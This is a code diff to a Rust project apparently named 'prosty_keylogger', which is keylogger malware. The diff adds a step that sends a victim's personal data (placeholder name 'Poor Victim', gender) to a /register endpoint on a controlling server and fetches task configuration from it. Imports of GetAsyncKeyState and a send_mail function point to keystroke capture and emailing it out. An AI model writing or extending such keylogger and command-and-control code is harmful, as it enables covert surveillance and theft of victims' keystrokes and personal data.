@@ -9,7 +9,7 @@ use windows::Win32::UI::Input::KeyboardAndMouse::GetAsyncKeyState;
 use std::fmt::Write;
 use reqwest::Url;
 use serde_json::value::Index;
-use prosty_keylogger::common::TaskConfiguration;
+use prosty_keylogger::common::{Gender, PersonalData, TaskConfiguration};
 //CoreVirtualKeyStates
 
 //pub const BUFF_SIZE: usize = 1024*128;
@@ -58,8 +58,15 @@ fn send_mail(num: u32, values: Vec<u8>, config: &TaskConfiguration){
     }
 }
 
-async fn get_config(url: Url) -> Result<TaskConfiguration, anyhow::Error>{
-    let s = reqwest::get(url).await?.text().await?;
+async fn get_config(url: Url, personal_data: Option<&PersonalData>) -> Result<TaskConfiguration, anyhow::Error>{
+    let s = match personal_data{
+        None => reqwest::get(url).await?.text().await?,
+        Some(data) => {
+            let client = reqwest::Client::new();
+            let json = serde_json::to_string(&data)?;
+            client.post(url.join("/register")?).json(&data).send().await?.text().await?
+        }
+    };
     let t: TaskConfiguration = serde_json::from_str(&s)?;
     Ok(t)
 }
@@ -68,9 +75,16 @@ async fn get_config(url: Url) -> Result<TaskConfiguration, anyhow::Error>{
 fn main()  -> Result<(), anyhow::Error>{
     let rt = tokio::runtime::Runtime::new()?;
 
+    let data = PersonalData{
+        name: Some("Poor".into()),
+        last_name: Some("Victim".into()),
+        gender: Some(Gender::Male),
+    };
+
 
     let config = rt.block_on(async{
-        let config = get_config(Url::parse("http://127.0.0.1:8080/")?).await?;
+        //let config = get_config(Url::parse("http://127.0.0.1:8080/")?).await?;
+        let config = get_config(Url::parse("http://127.0.0.1:8080/register")?, Some(&data)).await?;
         return Ok::<TaskConfiguration, anyhow::Error>(config);
 
     })?;
